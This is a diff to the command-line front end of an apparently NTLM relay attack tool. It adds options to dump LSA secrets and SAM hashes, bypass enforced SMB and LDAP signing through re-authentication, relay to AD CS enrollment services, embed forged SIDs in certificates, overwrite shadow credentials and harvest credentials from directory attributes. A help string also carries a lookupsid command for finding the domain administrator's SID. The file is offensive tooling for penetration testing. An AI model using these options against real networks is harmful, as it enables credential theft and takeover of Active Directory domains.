@@ -98,7 +98,7 @@ class MiniShell(cmd.Cmd):
         return
 
     def do_finished_attacks(self, line):
-        for url in self.relayConfig.target.finishedAttacks:
+        for url in self.relayConfig.target.allFinishedAttacks:
             print (url.geturl())
         return
 
@@ -195,7 +195,8 @@ def start_servers(options, threads):
         c.setLootdir(options.lootdir)
         c.setOutputFile(options.output_file)
         c.setdumpHashes(options.dump_hashes)
-        c.setLDAPOptions(options.no_dump, options.no_da, options.no_acl, options.no_validate_privs, options.escalate_user, options.add_computer, options.delegate_access, options.dump_laps, options.dump_gmsa, options.dump_adcs, options.sid, options.add_dns_record)
+        c.setDumpLSA(options.dump_lsa)
+        c.setLDAPOptions(options.no_dump, options.no_da, options.no_acl, options.no_validate_privs, options.escalate_user, options.add_computer, options.delegate_access, options.dump_laps, options.dump_gmsa, options.dump_adcs, options.sid, options.add_dns_record, options.dump_info_attr, options.dump_pre2k, delegatetarget=options.delegate_target)
         c.setRPCOptions(options.rpc_mode, options.rpc_use_smb, options.auth_smb, options.hashes_smb, options.rpc_smb_port, options.icpr_ca_name)
         c.setMSSQLOptions(options.query)
         c.setInteractive(options.interactive)
@@ -207,18 +208,24 @@ def start_servers(options, threads):
         c.setSMBRPCAttack(options.rpc_attack)
         c.setInterfaceIp(options.interface_ip)
         c.setExploitOptions(options.remove_mic, options.remove_target, options.remove_sign_seal)
+        c.setReauthBypassOptions(options.reauth_bypass, options.reauth_bypass_hashes)
         c.setWebDAVOptions(options.serve_image)
         c.setIsADCSAttack(options.adcs)
+        c.setIsCESAttack(options.adcs_ces)
         c.setADCSOptions(options.template)
+        c.setEnumTemplates(options.enum_templates)
         c.setIsShadowCredentialsAttack(options.shadow_credentials)
         c.setShadowCredentialsOptions(options.shadow_target, options.pfx_password, options.export_type,
-                                      options.cert_outfile_path)
+                          options.cert_outfile_path, options.shadow_replace,
+                          options.backup_path)
         c.setIsSCCMPoliciesAttack(options.sccm_policies)
         c.setIsSCCMDPAttack(options.sccm_dp)
         c.setSCCMPoliciesOptions(options.sccm_policies_clientname, options.sccm_policies_sleep)
         c.setSCCMDPOptions(options.sccm_dp_extensions, options.sccm_dp_files)
         
         c.setAltName(options.altname)
+        c.setAltSid(options.altSid)
+        c.setHTTPS(options.https, options.certfile, options.keyfile)
 
         #If the redirect option is set, configure the HTTP server to redirect targets to SMB
         if server is HTTPRelayServer and options.r is not None:
@@ -322,7 +329,8 @@ if __name__ == '__main__':
     parser.add_argument('-ra','--random', action='store_true', help='Randomize target selection')
     parser.add_argument('-r', action='store', metavar = 'SMBSERVER', help='Redirect HTTP requests to a file:// path on SMBSERVER')
     parser.add_argument('-l','--lootdir', action='store', type=str, required=False, metavar = 'LOOTDIR',default='.', help='Loot '
-                    'directory in which gathered loot such as SAM dumps will be stored (default: current directory).')
+                    'directory in which gathered loot such as SAM hashes and optional LSA secrets will be stored '
+                    '(default: current directory).')
     parser.add_argument('-of','--output-file', action='store',help='base output filename for encrypted hashes. Suffixes '
                                                                    'will be added for ntlm and ntlmv2')
     parser.add_argument('-dh','--dump-hashes', action='store_true', default=False, help='show encrypted hashes in the console')
@@ -348,17 +356,28 @@ if __name__ == '__main__':
     parser.add_argument('--remove-sign-seal', action='store_true', help='Remove SIGN/SEAL-related NTLM negotiate flags (exploit CVE-2025-33073)')
     parser.add_argument('--serve-image', action='store',help='local path of the image that will we returned to clients')
     parser.add_argument('-c', action='store', type=str, required=False, metavar = 'COMMAND', help='Command to execute on '
-                        'target system (for SMB and RPC). If not specified for SMB, hashes will be dumped (secretsdump.py must be'
-                        ' in the same directory). For RPC no output will be provided.')
+                        'target system (for SMB and RPC). If not specified for SMB, SAM hashes will be dumped; '
+                        'use --dump-lsa to also dump LSA secrets. For RPC no output will be provided.')
     parser.add_argument('--mssql-db', action='store', required = False, help='Database for MSSQL relay')
 
     #SMB arguments
     smboptions = parser.add_argument_group("SMB client options")
 
     smboptions.add_argument('-e', action='store', required=False, metavar = 'FILE', help='File to execute on the target system. '
-                                     'If not specified, hashes will be dumped (secretsdump.py must be in the same directory)')
+                                     'If not specified, SAM hashes will be dumped; use --dump-lsa to also dump LSA secrets')
+    smboptions.add_argument('--dump-lsa', action='store_true', default=False,
+                            help='Dump LSA secrets in addition to SAM hashes')
     smboptions.add_argument('--enum-local-admins', action='store_true', required=False, help='If relayed user is not admin, attempt SAMR lookup to see who is (only works pre Win 10 Anniversary)')
     smboptions.add_argument('--rpc-attack', action='store', choices=[None, "TSCH", "ICPR"], required=False, default=None, help='Select the attack to perform over RPC over named pipes.')
+    smboptions.add_argument('--reauth-bypass', action='store', required=False, metavar='[domain/]username[:password]',
+                            help='Defeat enforced signing: open a session with this low-privilege account and relay '
+                                 'the captured authentication under its signing key. Against an SMB target this is a '
+                                 're-authentication (MS-SMB2 3.3.5.5.2); against an ldap:// target it injects one '
+                                 'write chosen with the usual LDAP attack options (--delegate-access, '
+                                 '--shadow-credentials), and a bare ":" (anonymous) often works there. Needs '
+                                 '-smb2support, and is fixed on hosts updated since September 2026')
+    smboptions.add_argument('--reauth-bypass-hashes', action='store', required=False, metavar='LMHASH:NTHASH',
+                            help='Hashes of the --reauth-bypass account, instead of its password')
     
     #RPC arguments
     rpcoptions = parser.add_argument_group("RPC client options")
@@ -385,6 +404,12 @@ if __name__ == '__main__':
     httpoptions.add_argument('-domain', action="store", help='Domain FQDN or IP to connect using NETLOGON')
     httpoptions.add_argument('-remove-target', action='store_true', default=False,
                             help='Try to remove the target in the challenge message (in case CVE-2019-1019 patch is not installed)')
+    httpoptions.add_argument('--https', action='store_true',
+                            help='Enable TLS (HTTPS) on the HTTP relay server')
+    httpoptions.add_argument('--certfile', action='store', metavar='FILE',
+                            help='Path to server certificate (PEM format) for HTTPS')
+    httpoptions.add_argument('--keyfile', action='store', metavar='FILE',
+                            help='Path to private key (PEM format) for HTTPS, if not included in the certificate file')
 
     #LDAP options
     ldapoptions = parser.add_argument_group("LDAP client options")
@@ -394,10 +419,13 @@ if __name__ == '__main__':
     ldapoptions.add_argument('--no-validate-privs', action='store_false', required=False, help='Do not attempt to enumerate privileges, assume permissions are granted to escalate a user via ACL attacks')
     ldapoptions.add_argument('--escalate-user', action='store', required=False, help='Escalate privileges of this user instead of creating a new one')
     ldapoptions.add_argument('--delegate-access', action='store_true', required=False, help='Delegate access on relayed computer account to the specified account')
+    ldapoptions.add_argument('--delegate-target', action='store', metavar='account|DN', required=False, help='Object to write RBCD on (sAMAccountName, or a full DN for the signing bypass), instead of the relayed computer itself')
     ldapoptions.add_argument('--sid', action='store_true', required=False, help='Use a SID to delegate access rather than an account name')
     ldapoptions.add_argument('--dump-laps', action='store_true', required=False, help='Attempt to dump any LAPS passwords readable by the user')
     ldapoptions.add_argument('--dump-gmsa', action='store_true', required=False, help='Attempt to dump any gMSA passwords readable by the user')
     ldapoptions.add_argument('--dump-adcs', action='store_true', required=False, help='Attempt to dump ADCS enrollment services and certificate templates info')
+    ldapoptions.add_argument('--dump-info-attr', action='store_true', required=False, help='Attempt to dump the info attribute of all user and group domain objects (may contain credentials)')
+    ldapoptions.add_argument('--dump-pre2k', action='store_true', required=False, help='Enumerate computer accounts vulnerable to pre-Windows 2000 authentication (predictable password)')
     ldapoptions.add_argument('--add-dns-record', nargs=2, action='store', metavar=('NAME', 'IPADDR'), required=False, help='Add the <NAME> record to DNS via LDAP pointing to <IPADDR>')
 
     #Common options for SMB and LDAP
@@ -418,8 +446,14 @@ if __name__ == '__main__':
     # AD CS options
     adcsoptions = parser.add_argument_group("AD CS attack options")
     adcsoptions.add_argument('--adcs', action='store_true', required=False, help='Enable AD CS relay attack')
-    adcsoptions.add_argument('--template', action='store', metavar="TEMPLATE", required=False, help='AD CS template. Defaults to Machine or User whether relayed account name ends with `$`. Relaying a DC should require specifying `DomainController`')
+    adcsoptions.add_argument('--adcs-ces', action='store_true', default=False, help='Enable AD CS Certificate Enrollment Services (CES/WSTEP) relay attack')
+    adcsoptions.add_argument('--template', action='store', metavar="TEMPLATE", required=False, help='AD CS template. Defaults to Machine for computer accounts and User for user accounts.')
     adcsoptions.add_argument('--altname', action='store', metavar="ALTNAME", required=False, help='Subject Alternative Name to use when performing ESC1 or ESC6 attacks.')
+    adcsoptions.add_argument('--altsid', action='store', dest='altSid', metavar="SID", required=False,
+                             help='Object SID to embed in szOID_NTDS_CA_SECURITY_EXT (1.3.6.1.4.1.311.25.2). '
+                                  'Required when StrongCertificateBindingEnforcement >= 1 (default on updated DCs since Feb 2025). '
+                                  'Obtain with: lookupsid.py DOMAIN/user:pass@DC | grep " 500$"')
+    adcsoptions.add_argument('--enum-templates', action='store_true', required=False, help='Enumerate enabled AD CS templates that the relayed account has access to')
 
     # Shadow Credentials attack options
     shadowcredentials = parser.add_argument_group("Shadow Credentials attack options")
@@ -431,6 +465,10 @@ if __name__ == '__main__':
     shadowcredentials.add_argument('--export-type', action='store', required=False, choices=["PEM", "PFX"], type=lambda choice: choice.upper(), default="PFX",
                                    help='choose to export cert+private key in PEM or PFX (i.e. #PKCS12) (default: PFX))')
     shadowcredentials.add_argument('--cert-outfile-path', action='store', required=False, help='filename to store the generated self-signed PEM or PFX certificate and key')
+    shadowcredentials.add_argument('--shadow-replace', action='store_true', required=False,
+                                   help='Overwrite existing KeyCredentials with the new one instead of appending. Existing KeyCredentials are backed up to JSON first (see --backup-path)')
+    shadowcredentials.add_argument('--backup-path', action='store', required=False,
+                                   help='Path to backup JSON file used with --shadow-replace. If .json is omitted it is appended automatically')
 
     # SCCM policies options
     sccmpoliciesoptions = parser.add_argument_group("SCCM Policies attack options")
@@ -448,6 +486,47 @@ if __name__ == '__main__':
     except Exception as e:
        logging.error(str(e))
        sys.exit(1)
+
+    if options.adcs_ces:
+        incompatible_modes = []
+        if options.adcs:
+            incompatible_modes.append('--adcs')
+        if options.sccm_policies:
+            incompatible_modes.append('--sccm-policies')
+        if options.sccm_dp:
+            incompatible_modes.append('--sccm-dp')
+        if incompatible_modes:
+            parser.error('--adcs-ces cannot be combined with %s' % ', '.join(incompatible_modes))
+        if options.altname or options.altSid or options.enum_templates:
+            parser.error('--altname, --altsid and --enum-templates are not supported with --adcs-ces')
+        if options.target is None and options.tf is None:
+            parser.error('--adcs-ces requires -t or -tf; reflection mode is not supported')
+        if options.target is not None and options.tf is not None:
+            parser.error('--adcs-ces accepts either -t or -tf, not both')
+        if options.socks or options.interactive or options.r is not None:
+            parser.error('--adcs-ces cannot be combined with SOCKS, interactive, or HTTP-to-SMB redirect mode')
+
+    if options.https and options.certfile is None:
+        parser.error('--https requires --certfile')
+
+    if options.reauth_bypass is None:
+        if options.reauth_bypass_hashes is not None:
+            parser.error('--reauth-bypass-hashes requires --reauth-bypass')
+    elif not options.smb2support:
+        parser.error('--reauth-bypass requires -smb2support')
+    elif options.remove_target:
+        parser.error('--reauth-bypass cannot be combined with -remove-target, which overwrites the session key')
+    elif options.target is not None and options.target.lower().startswith('ldap'):
+        # The LDAP bypass is single-shot: one write from the existing attack options, no -i / -socks
+        if options.socks or options.interactive:
+            parser.error('--reauth-bypass against an LDAP target is single-shot; -i and -socks are not supported '
+                         '(the SASL seal key becomes the victim\'s after the bind)')
+        if not (options.delegate_access or options.shadow_credentials):
+            parser.error('--reauth-bypass against an LDAP target needs one write attack: '
+                         '--delegate-access or --shadow-credentials')
+        if options.remove_mic or options.remove_sign_seal:
+            parser.error('--reauth-bypass against an LDAP target forwards the victim mechListMIC, which '
+                         '-remove-mic / -remove-sign-seal strip')
 
     if options.rpc_use_smb and not options.auth_smb:
        logging.error("Set -auth-smb to relay DCE/RPC to SMB pipes")
@@ -537,7 +616,7 @@ if __name__ == '__main__':
     if not options.no_rdp_server:
         RELAY_SERVERS.append(RDPRelayServer)
 
-    if targetSystem is not None and options.w:
+    if targetSystem is not None and options.tf is not None and options.w:
         watchthread = TargetsFileWatcher(targetSystem)
         watchthread.start()
 
